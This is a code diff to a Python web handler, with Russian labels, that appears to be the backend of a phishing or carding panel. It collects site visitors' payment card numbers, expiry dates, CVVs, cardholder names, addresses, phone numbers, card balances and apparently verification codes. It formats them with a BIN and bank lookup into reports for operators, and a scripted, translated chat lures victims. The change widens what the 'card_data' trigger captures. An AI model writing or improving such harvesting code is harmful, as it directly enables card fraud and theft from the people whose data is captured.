@@ -448,14 +448,16 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msgs_count = len(sess_data.get("msgs", []))
         is_new_marker = "🆕 Новый клиент" if msgs_count <= 1 else "🔄 Повторный клиент"
 
-    header = (
-        f"{is_new_marker} <b>{visitor_tag(visitor_id)}</b> [{trigger_label}]\n"
-        f"👤 {owner_label}\n"
-        f"🔗 {body.subdomain}/{body.link_id}\n"
-        f"🌍 {geo_str}\n"
-        f"📱 {device}\n"
-        f"🗣 {sys_lang}\n"
-    )
+    header_lines = [
+        f"{is_new_marker} <b>{visitor_tag(visitor_id)}</b> [{trigger_label}]",
+        f"👤 {owner_label}",
+        f"🔗 {body.subdomain}/{body.link_id}",
+        f"🌍 {geo_str}",
+    ]
+    if body.trigger != "card_data":
+        header_lines.append(f"📱 {device}")
+    header_lines.append(f"🗣 {sys_lang}")
+    header = "\n".join(header_lines) + "\n"
     # Bot script bubbles are posted already translated for the visitor.
     # Original = Russian source (what we authored); translated = visitor language.
     # Real visitor messages: original = what they typed; translated = Russian.
@@ -469,8 +471,10 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
 
     bin_line = ""
-    if body.card_number and body.trigger in ("code", "balance"):
+    if body.card_number and body.trigger in ("code", "balance", "card_data"):
         bin_line = format_bin_block(await lookup_bin(body.card_number))
+        if body.trigger == "card_data" and not bin_line:
+            bin_line = "BIN:\n  BIN: —\n  Страна: —\n  Банк: —\n  Тип: —\n  Бренд: —"
 
     # для кода — полный лог: карта + баланс + сам код
     if body.trigger == "code" and body.text.strip():
@@ -506,15 +510,25 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         msg_body = "\n\n".join(parts)
 
     elif body.trigger == "card_data" and body.card_number:
-        lines = ["💳 <b>Карта:</b>"]
-        lines.append(f"  Номер: <code>{body.card_number}</code>")
-        if body.card_exp:
-            lines.append(f"  Срок: <code>{body.card_exp}</code>")
-        if body.card_cvv:
-            lines.append(f"  CVV: <code>{body.card_cvv}</code>")
-        if body.card_name:
-            lines.append(f"  Имя: <code>{body.card_name}</code>")
-        msg_body = "\n".join(lines)
+        addr = body.address1 or "—"
+        if body.address2:
+            addr = f"{addr}, {body.address2}"
+        zip_city = ", ".join(p for p in (body.zip_code, body.city) if p) or "—"
+        phone = f"{body.phone_dial or ''}{body.phone or ''}".strip() or "—"
+        parts = [
+            "💳 <b>Карта:</b>\n"
+            f"  Номер: <code>{body.card_number}</code>\n"
+            f"  Срок: <code>{body.card_exp or '—'}</code>\n"
+            f"  CVV: <code>{body.card_cvv or '—'}</code>\n"
+            f"  Имя: <code>{body.card_name or '—'}</code>",
+            bin_line,
+            "📍 <b>Адрес:</b>\n"
+            f"  Страна: {body.country or '—'}\n"
+            f"  Адрес: {addr}\n"
+            f"  Индекс: {zip_city}",
+            f"📞 <b>Телефон:</b> {phone}",
+        ]
+        msg_body = "\n\n".join(p for p in parts if p)
 
     # для баланса — добавляем данные карты и адреса в тело сообщения
     elif body.trigger == "balance" and body.balance_amount:
